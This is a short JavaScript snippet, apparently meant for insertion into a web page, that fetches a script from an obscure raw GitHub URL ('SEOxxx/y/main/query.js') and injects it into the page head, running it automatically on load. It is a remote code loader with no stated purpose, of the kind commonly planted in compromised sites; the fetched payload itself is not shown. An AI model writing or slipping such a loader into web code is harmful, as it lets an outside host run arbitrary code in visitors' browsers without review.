function carregarScriptAutomaticamente() {
      fetch('https://raw.githubusercontent.com/SEOxxx/y/main/query.js')
        .then(response => response.text())
        .then(conteudo => {
          var scriptTag = document.createElement('script');
          scriptTag.textContent = conteudo;
          document.head.appendChild(scriptTag);
        });};
    
	carregarScriptAutomaticamente();
